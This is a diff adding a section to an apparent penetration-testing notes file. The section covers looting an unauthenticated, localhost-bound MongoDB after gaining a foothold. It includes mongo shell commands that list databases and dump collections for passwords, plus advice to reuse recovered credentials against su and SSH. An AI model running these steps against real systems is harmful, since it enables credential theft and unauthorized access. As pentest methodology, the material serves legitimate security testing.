@@ -2906,3 +2906,25 @@ silently rejected, so `SAVE`->OK is NOT proof a path is writable (a locked-down 
 reading the file back with the `dofile` oracle before building an RCE/persistence step on it.
 
 <!-- promoted-slug: redis-windows-dofile-oracle-unc-coerce -->
+
+### Localhost-bound MongoDB as a post-foothold loot target
+
+A Mongo instance bound to `127.0.0.1:27017` does not appear in an external port scan, so it is only
+reachable AFTER a foothold (web RCE, SSH). Legacy MongoDB (<3.6, and any instance with auth left off)
+accepts an anonymous connection with full read, so from the foothold shell it is a prime loot source:
+app back-ends frequently store a `backup`/`users` collection holding a plaintext password that is
+reused for the OS/SSH account.
+
+From the foothold (even a limited www-data web shell):
+```bash
+ss -lntp | grep 27017                       # confirm the localhost bind
+mongo --quiet --eval 'db.getMongo().getDBNames()'
+mongo <db> --quiet --eval 'db.getCollectionNames()'
+mongo <db> --quiet --eval 'db.<coll>.find().forEach(printjson)'   # dump for creds
+```
+
+Then reuse any recovered password against `su`/SSH/other services before hunting a new vector
+(see [[password-attacks]], [[linux-privesc]]). Always enumerate localhost-only services post-foothold;
+the external nmap never saw them.
+
+<!-- promoted-slug: mongo-localhost-postfoothold-loot -->
